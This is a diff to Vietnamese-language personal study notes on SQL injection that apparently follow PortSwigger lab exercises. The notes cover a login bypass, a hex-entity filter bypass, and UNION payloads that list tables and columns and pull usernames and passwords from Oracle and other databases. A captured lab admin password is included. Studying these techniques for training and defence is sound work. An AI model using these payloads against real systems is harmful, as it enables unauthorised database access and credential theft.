@@ -1,8 +1,8 @@
+#SQL injection cheat sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
 @Truy xuất dữ liệu ẩn bằng mệnh đề WHERE
 VD: SELECT * FROM products WHERE category = 'Gifts' AND released = 1
 (BURP)Bắt requests đổi category thành 
 '+OR+1=1--
-XONG
 
 @BYPASS LOGIN 
 VD:SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
@@ -25,4 +25,34 @@ thay thử <storeId>1 UNION SELECT NULL</storeId>
 ko được thì dùng ext hackverto bypass thành giống như thế này 
 <@hex_entities> .........<@/hex_entities>
 <@hex_entities> 1 UNION SELECT username || '~'||  password  FROM users<@/hex_entities> // để lấy username, password
- 
+
+@Truy vấn loại csdl và phiên bản trên Oracle
+Xác định số cột được truy vấn trả về và những cột nào chứa dữ liệu văn bản. 
+Xác minh rằng truy vấn trả về hai cột, cả hai đều chứa văn bản, bằng cách thay đổi category:
+'+UNION+SELECT+'abc','def'+FROM+dual--
+Hiển thị phiên bản cơ sở dữ liệu:
+'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
+
+@Liệt kê nội dung cơ sở dữ liệu trên các cơ sở dữ liệu không phải của Oracle
+Lưu ý: các lệnh SQLI sử dụng dấu + là để thay cho dấu space or %20
+(Burp) thay catogery:
+#Xác minh rằng truy vấn trả về hai cột, cả hai đều chứa văn bản, bằng cách sử dụng tải trọng như sau trong category tham số:
+'+UNION+SELECT+'abc','def'--
+#Lấy thông tin của các bảng trong csdl
+'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+#Truy cập bảng để lấy thông tin về các cột (Thay đổi table_name thành bảng tương ứng)(thay ở ????)
+'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='????'--
+#Lấy username và passwd người dùng , thay username_aaa thành tên cột username xuất hiện trong đó , password_aaa cũng vậy.
+#Còn FROM user???? thì thay tên table vào.
+' UNION SELECT username_aaa, password_bnlxqq FROM user????--
+=>administrator j2klsyxsaed07trfpluy
+
+@Liệt kê nội dung cơ sở dữ liệu trên Oracle
+#Xác minh rằng truy vấn trả về hai cột, cả hai đều chứa văn bản, bằng cách sử dụng tải trọng như sau trong category tham số:
+'+UNION+SELECT+'abc','def'+FROM+dual--
+#Lấy danh sách các bảng trong csdl.
+'+UNION+SELECT+table_name,NULL+FROM+all_tables--
+#Lấy data các cột trong bảng (Thay USERS_ABCDEF thành bảng cần get data vừa tìm ở trên)
+'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
+#Truy xuất username và password của tất cả người dùng (Thay tên cột username , password và bảng USER_ABCDEF
+'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
